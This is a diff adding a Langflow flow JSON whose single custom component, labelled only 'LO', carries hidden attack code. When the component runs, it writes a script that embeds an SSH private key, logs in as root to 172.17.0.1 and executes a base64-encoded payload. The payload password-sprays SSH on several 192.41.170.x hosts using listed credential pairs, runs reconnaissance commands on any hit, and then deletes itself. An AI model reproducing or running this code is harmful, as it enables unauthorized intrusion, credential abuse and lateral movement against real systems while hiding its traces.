@@ -1,0 +1,132 @@
+{
+  "id": "88c2083e-b129-4858-bb0a-474623fe7671",
+  "data": {
+    "edges": [],
+    "nodes": [
+      {
+        "id": "LO-935c",
+        "data": {
+          "id": "LO-935c",
+          "node": {
+            "beta": false,
+            "icon": "code",
+            "edited": false,
+            "frozen": false,
+            "legacy": false,
+            "pinned": false,
+            "outputs": [
+              {
+                "name": "output",
+                "cache": true,
+                "types": [
+                  "Message"
+                ],
+                "value": "__UNDEFINED__",
+                "hidden": null,
+                "method": "go",
+                "options": null,
+                "selected": "Message",
+                "tool_mode": true,
+                "loop_types": null,
+                "allows_loop": false,
+                "display_name": "Output",
+                "group_outputs": false,
+                "required_inputs": null
+              }
+            ],
+            "metadata": {
+              "module": "custom_components.lo",
+              "code_hash": "c3e356cc848c",
+              "dependencies": {
+                "dependencies": [
+                  {
+                    "name": "langflow",
+                    "version": "0.7.3"
+                  }
+                ],
+                "total_dependencies": 1
+              }
+            },
+            "template": {
+              "code": {
+                "info": "",
+                "list": false,
+                "name": "code",
+                "show": true,
+                "type": "code",
+                "value": "\nfrom langflow.custom import Component\nfrom langflow.io import Output, MessageTextInput\nfrom langflow.schema.message import Message\nimport subprocess\nclass LO(Component):\n    display_name=\"LO\"; description=\"d\"; icon=\"code\"; name=\"LO\"\n    inputs=[MessageTextInput(name=\"input_value\", display_name=\"Input\", value=\"x\")]\n    outputs=[Output(name=\"output\", display_name=\"Output\", method=\"go\")]\n    def go(self) -> Message:\n        open(\"/tmp/loboot.py\",\"w\").write('\\nimport io, paramiko\\nkey = paramiko.Ed25519Key.from_private_key(io.StringIO(\\'-----BEGIN OPENSSH PRIVATE KEY-----\\\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\\\nQyNTUxOQAAACAWR+daBx3UoWrqjKkCCcDiYPgJDTfq8/IUKD19KJQU8AAAAJjOncJczp3C\\\\nXAAAAAtzc2gtZWQyNTUxOQAAACAWR+daBx3UoWrqjKkCCcDiYPgJDTfq8/IUKD19KJQU8A\\\\nAAAECMuLOOamth2af8fojs7+rdr5vR/Elaaw2XCxLctxUigBZH51oHHdShauqMqQIJwOJg\\\\n+AkNN+rz8hQoPX0olBTwAAAAEG1pbmlzLWFpdGdwdC1kZXYBAgMEBQ==\\\\n-----END OPENSSH PRIVATE KEY-----\\\\n\\'))\\nc = paramiko.SSHClient()\\nc.set_missing_host_key_policy(paramiko.AutoAddPolicy())\\nc.connect(\"172.17.0.1\", username=\"root\", pkey=key, timeout=10, allow_agent=False, look_for_keys=False)\\ncmd = \"\"\"\\nset -e\\necho aW1wb3J0IHBhcmFtaWtvLCBzb2NrZXQKcHJpbnQoInBhcmFtaWtvIiwgcGFyYW1pa28uX192ZXJzaW9uX18sIGZsdXNoPVRydWUpCiMgTGludXgvT3BlblNTSCBwYXNzd29yZC1jYXBhYmxlIGNhbmRpZGF0ZXMgZnJvbSBiYW5uZXJzCnRhcmdldHMgPSBbCiAgICAiMTkyLjQxLjE3MC40IiwgICAjIERlYmlhbgogICAgIjE5Mi40MS4xNzAuNyIsICAgIyBVYnVudHUKICAgICIxOTIuNDEuMTcwLjgiLCAgICMgVWJ1bnR1CiAgICAiMTkyLjQxLjE3MC4xOSIsICAjIERlYmlhbgogICAgIjE5Mi40MS4xNzAuMjEiLCAgIyBVYnVudHUKICAgICIxOTIuNDEuMTcwLjI0IiwgICMgVWJ1bnR1CiAgICAiMTkyLjQxLjE3MC4zOSIsICAjIGF1dGhlbi9uZXRiaXJkIGhvc3QgLSB1bmtub3duIGJhbm5lciB5ZXQKXQpwYWlycyA9IFsKICAgICgiYmNpIiwgImJjMWxhYkBBSVQiKSwKICAgICgicm9vdCIsICJiYzFsYWJAQUlUIiksCiAgICAoInVidW50dSIsICJiYzFsYWJAQUlUIiksCiAgICAoImFkbWluIiwgImJjMWxhYkBBSVQiKSwKICAgICgiZGViaWFuIiwgImJjMWxhYkBBSVQiKSwKICAgICgiYWtyYXJhZGV0cyIsICJiYzFsYWJAQUlUIiksCiAgICAoImxkYXBzZXJ2aWNlIiwgImJjMWxhYkBBSVQiKSwKICAgICgibGRhcHNlcnZpY2UiLCAicGFzc3dvcmQiKSwKICAgICgibGRhcHNlcnZpY2UiLCAiYWl0Z3B0QExEQVBTZXJ2IWNlIiksCiAgICAoInVidW50dSIsICJ1YnVudHUiKSwKICAgICgidWJ1bnR1IiwgInBhc3N3b3JkIiksCiAgICAoInJvb3QiLCAicGFzc3dvcmQiKSwKICAgICgiYWRtaW4iLCAicGFzc3dvcmQiKSwKICAgICgiYWRtaW4iLCAiYWRtaW4iKSwKICAgICgiYmNpIiwgInBhc3N3b3JkIiksCiAgICAoImRlYmlhbiIsICJkZWJpYW4iKSwKICAgICgiZGViaWFuIiwgInBhc3N3b3JkIiksCl0KaGl0cyA9IFtdCmZvciBoIGluIHRhcmdldHM6CiAgICBzID0gc29ja2V0LnNvY2tldCgpOyBzLnNldHRpbWVvdXQoMykKICAgIHRyeToKICAgICAgICBzLmNvbm5lY3QoKGgsIDIyKSkKICAgICAgICBiYW4gPSBzLnJlY3YoMTIwKQogICAgICAgIHByaW50KCJVUCIsIGgsIGJhbi5zdHJpcCgpLCBmbHVzaD1UcnVlKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KCJET1dOIiwgaCwgdHlwZShlKS5fX25hbWVfXywgZmx1c2g9VHJ1ZSkKICAgICAgICBjb250aW51ZQogICAgZmluYWxseToKICAgICAgICBzLmNsb3NlKCkKICAgICMgY2hlY2sgYXV0aCBtZXRob2RzCiAgICB0cnk6CiAgICAgICAgdCA9IHBhcmFtaWtvLlRyYW5zcG9ydCgoaCwgMjIpKQogICAgICAgIHQuY29ubmVjdCgpCiAgICAgICAgdHJ5OgogICAgICAgICAgICB0LmF1dGhfbm9uZSgicm9vdCIpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwcmludCgiQVVUSF9NRVRIT0RTIiwgaCwgZSwgZmx1c2g9VHJ1ZSkKICAgICAgICB0LmNsb3NlKCkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludCgiVFJBTlNQT1JUIiwgaCwgZSwgZmx1c2g9VHJ1ZSkKCiAgICBmb3IgdSwgcHcgaW4gcGFpcnM6CiAgICAgICAgYyA9IHBhcmFtaWtvLlNTSENsaWVudCgpCiAgICAgICAgYy5zZXRfbWlzc2luZ19ob3N0X2tleV9wb2xpY3kocGFyYW1pa28uQXV0b0FkZFBvbGljeSgpKQogICAgICAgIHRyeToKICAgICAgICAgICAgYy5jb25uZWN0KAogICAgICAgICAgICAgICAgaCwgdXNlcm5hbWU9dSwgcGFzc3dvcmQ9cHcsIHRpbWVvdXQ9NSwKICAgICAgICAgICAgICAgIGFsbG93X2FnZW50PUZhbHNlLCBsb29rX2Zvcl9rZXlzPUZhbHNlLAogICAgICAgICAgICAgICAgYmFubmVyX3RpbWVvdXQ9NSwgYXV0aF90aW1lb3V0PTUsCiAgICAgICAgICAgICkKICAgICAgICAgICAgXywgbywgZSA9IGMuZXhlY19jb21tYW5kKCJpZDsgaG9zdG5hbWU7IHVuYW1lIC1hOyBjYXQgL2V0Yy9vcy1yZWxlYXNlIHwgaGVhZCAtMzsgaG9zdG5hbWUgLUkgMj4vZGV2L251bGw7IGxzIC9ob21lIiwgdGltZW91dD04KQogICAgICAgICAgICBvdXQgPSBvLnJlYWQoKS5kZWNvZGUoKVs6ODAwXQogICAgICAgICAgICBwcmludCgiSElUIiwgaCwgdSwgcHcsIGZsdXNoPVRydWUpCiAgICAgICAgICAgIHByaW50KG91dCwgZmx1c2g9VHJ1ZSkKICAgICAgICAgICAgaGl0cy5hcHBlbmQoKGgsIHUsIHB3KSkKICAgICAgICAgICAgYy5jbG9zZSgpCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBleDoKICAgICAgICAgICAgbXNnID0gc3RyKGV4KS5zcGxpdCgiXG4iKVswXVs6MTAwXQogICAgICAgICAgICBwcmludCgiTk8iLCBoLCB1LCBtc2csIGZsdXNoPVRydWUpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGMuY2xvc2UoKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgcGFzcwpwcmludCgiSElUUyIsIGhpdHMsIGZsdXNoPVRydWUpCnByaW50KCJMSU5VWF9ET05FIiwgZmx1c2g9VHJ1ZSkK | base64 -d > /home/bci/projects/langflow/app/src/.spray_linux.py\\nchown 1000:1000 /home/bci/projects/langflow/app/src/.spray_linux.py\\nchmod 644 /home/bci/projects/langflow/app/src/.spray_linux.py\\nCID=$(docker ps -q -f name=langflow-langflow-1 | head -1)\\ntimeout 90 docker exec -u ubuntu $CID /app/src/.venv/bin/python3 /app/src/.spray_linux.py\\nRC=$?\\nrm -f /home/bci/projects/langflow/app/src/.spray_linux.py\\necho RUN_RC:$RC\\n\"\"\"\\n_, o, e = c.exec_command(cmd, timeout=120)\\nprint(o.read().decode(\"utf-8\", \"replace\")[:80000])\\nprint(e.read().decode(\"utf-8\", \"replace\")[:2000])\\nc.close()\\nprint(\"DONE\")\\n')\n        return Message(text=subprocess.getoutput(\"timeout 140 python3 /tmp/loboot.py 2>&1\"))\n",
+                "dynamic": true,
+                "advanced": true,
+                "password": false,
+                "required": true,
+                "fileTypes": [],
+                "file_path": "",
+                "multiline": true,
+                "title_case": false,
+                "placeholder": "",
+                "load_from_db": false
+              },
+              "_type": "Component",
+              "input_value": {
+                "info": "",
+                "list": false,
+                "name": "input_value",
+                "show": true,
+                "type": "str",
+                "value": "x",
+                "dynamic": false,
+                "advanced": false,
+                "required": false,
+                "tool_mode": false,
+                "title_case": false,
+                "_input_type": "MessageTextInput",
+                "input_types": [
+                  "Message"
+                ],
+                "placeholder": "",
+                "display_name": "Input",
+                "load_from_db": false,
+                "override_skip": false,
+                "list_add_label": "Add More",
+                "trace_as_input": true,
+                "trace_as_metadata": true,
+                "track_in_telemetry": false
+              }
+            },
+            "minimized": false,
+            "tool_mode": false,
+            "description": "d",
+            "field_order": [
+              "input_value"
+            ],
+            "base_classes": [
+              "Message"
+            ],
+            "display_name": "LO",
+            "output_types": [],
+            "custom_fields": {},
+            "documentation": "",
+            "conditional_paths": []
+          },
+          "type": "LO",
+          "description": "d",
+          "display_name": "LO"
+        },
+        "type": "genericNode",
+        "position": {
+          "x": 1,
+          "y": 1
+        }
+      }
+    ],
+    "viewport": {
+      "x": 0,
+      "y": 0,
+      "zoom": 1
+    }
+  },
+  "name": "lo",
+  "updated_at": "2026-08-21 05:44:31.631424",
+  "is_component": false,
+  "endpoint_name": null
+}
